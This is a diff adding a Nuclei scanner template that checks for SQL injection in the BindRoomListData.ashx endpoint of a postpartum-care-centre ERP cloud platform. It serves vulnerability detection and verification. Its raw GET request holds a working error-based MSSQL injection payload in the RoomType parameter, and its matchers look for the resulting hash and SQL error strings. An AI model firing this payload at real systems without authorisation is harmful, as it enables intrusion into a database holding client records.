@@ -1,0 +1,34 @@
+id: poc-yaml-jintongfang-erp-bindroomlistdata-sqli
+info:
+  name: 月子会所ERP管理云平台 BindRoomListData SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for a SQL injection vulnerability in the BindRoomListData endpoint of 月子会所ERP管理云平台.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /Page/SalerManager/ashx/BindRoomListData.ashx?RZParam=1&RoomID=1&RoomName=1&RoomStyle=1&RoomType=1%27%20and%201%3dconvert(int,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))--&ddlFStoreID=1&IsShowCount=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Scanner
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: regex
+        regex:
+          - "0x{{t2}}"
+      - type: word
+        words:
+          - "SqlException"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+      - type: regex
+        regex:
+          - "在将(.*?)值"
